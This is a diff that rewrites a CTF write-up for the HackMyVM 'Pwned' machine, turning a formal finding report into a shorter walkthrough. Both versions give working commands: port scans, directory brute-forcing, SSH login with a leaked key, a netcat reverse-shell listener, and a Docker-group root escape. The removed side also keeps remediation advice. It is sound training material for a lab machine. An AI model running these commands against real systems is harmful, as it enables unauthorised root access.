@@ -1,109 +1,71 @@
-📑 Finding Report: Privilege Escalation to Root via Docker (Pwned – HackMyVM)
-
-Executive Summary
-Severity: High
-Brief description: Root access was obtained on the Pwned machine by abusing Docker group privileges. After gaining a shell as the user selena, it was discovered that this user had membership in the docker group. This allowed full access to the host filesystem and privilege escalation to root through a container escape technique.
-
-Scope and Environment
-Platform: HackMyVM
-Machine: Pwned (Easy – Linux)
-Assigned IP: 192.168.1.132
+🧩 Pwned Machine Walkthrough – HackMyVM
+Difficulty: Easy
+Goal: Gain initial access via leaked FTP credentials, then escalate to root using Docker group abuse.
+Target IP: 192.168.1.132
 Test Date: 07/06/2025
 
-Tools Used
-nmap
+🔍 Initial Enumeration
+Full TCP port scan:
 
-gobuster
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.132
+Service and version detection on discovered ports:
 
-ftp
+nmap -sCV -p21,22,80 192.168.1.132
+Discovered open ports:
 
-ssh
+21/tcp – FTP
 
-nc (netcat)
+22/tcp – OpenSSH
 
-docker
+80/tcp – HTTP
 
-Finding Description
-Initial reconnaissance using nmap revealed the following open ports:
+🌐 Web Analysis
+Directory brute-forcing with Gobuster:
 
-21/tcp (FTP)
+gobuster dir -u http://192.168.1.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100
+A login page is found. Viewing the source code reveals hardcoded FTP credentials.
 
-22/tcp (SSH)
+🔑 Initial Access via FTP and SSH Key
 
-80/tcp (HTTP)
+Using the leaked credentials, connect to the FTP server. Two files are downloaded:
 
-Web enumeration with gobuster uncovered hidden directories. Using browser developer tools (F12), plaintext FTP credentials were found embedded in the HTML code.
+id_rsa (SSH private key)
 
-Using these credentials, access to the FTP service was gained. The attacker retrieved an id_rsa private key and a note revealing the username ariadna.
+note.txt (mentioning user "ariadna")
 
-SSH login as ariadna succeeded using the private key. After further enumeration, it was found that the user selena could be impersonated via sudo to execute messenger.sh with NOPASSWD.
-
-This script included user input, which was leveraged to spawn a reverse shell to the attacker machine, providing access as user selena.
-
-A check of selena's privileges (id) revealed membership in the docker group. This allowed the attacker to mount the entire filesystem inside a Docker container and chroot into it, gaining root shell access.
-
-Proof of Concept (PoC)
-4.1. Port Scanning
-
-nmap -sC -sV -oN pwned_nmap.txt 192.168.1.132
-Open ports:
-
-21/tcp (FTP)
-
-22/tcp (SSH)
-
-80/tcp (HTTP)
-
-4.2. Web Enumeration
-
-gobuster dir -u http://192.168.1.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100
-Interesting directories were discovered, and login credentials were found in HTML source code.
-
-4.3. FTP Access & Credential Discovery
-
-ftp 192.168.1.132
-Downloaded: id_rsa, and a text file revealing the user ariadna
-
-SSH login successful with key:
+Set correct permissions:
 
 chmod 600 id_rsa
-ssh -i id_rsa arianda@192.168.1.132
-4.4. Lateral Movement to selena
+Access the target system via SSH:
+
+ssh -i id_rsa ariadna@192.168.1.132
+Access granted as user ariadna. The user.txt flag is found and read.
+
+⚡ Privilege Escalation to Root
+
+Check for sudo permissions:
 
 sudo -l
-# (Output showed `messenger.sh` could be run as selena without password)
+User ariadna can execute a script as selena without a password. Modify the script to spawn a reverse shell, then escalate to user selena.
 
-sudo -u selena /opt/messenger.sh
-# Injected reverse shell payload into input
-On the attacker machine:
-
-nc -lvnp 4444
-# Reverse shell received as selena
-4.5. Privilege Escalation via Docker
+Check user groups:
 
 id
-# User selena is part of docker group
+User selena is part of the docker group. Launch a container with host filesystem mounted:
 
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-# Full root shell obtained
-Impact
-Critical impact in both CTF and real-world scenarios. An attacker with access to a user in the docker group can:
+Root shell is obtained inside the container. Access to both user.txt and root.txt is confirmed.
 
-Escape container boundaries
+🎯 Conclusion
 
-Mount and modify host files
+The Pwned machine is fully compromised due to multiple security flaws:
 
-Gain persistent root access
+FTP credentials were hardcoded and visible in the website's source code.
 
-Pivot into other internal infrastructure
+SSH private key was publicly accessible via FTP.
 
-Recommendations / Remediation
-🔒 Restrict Docker Group Access: Only trusted administrators should be part of the docker group.
+A script was misconfigured to be executed via sudo without restrictions.
 
-🛡️ Use Docker with user namespaces to isolate container privileges.
+Membership in the docker group allowed privilege escalation to root.
 
-🔍 Audit Sudo Permissions: Avoid NOPASSWD on scripts that accept user input or aren't properly sanitized.
-
-🧼 Sanitize User Inputs in all scripts and validate expected commands or formats.
-
-📈 Enable Logging and Monitoring: Monitor Docker usage and reverse shell behavior with EDR or SIEM tools.
+By chaining these misconfigurations, full system compromise was achieved, from unauthenticated web access to full root control.
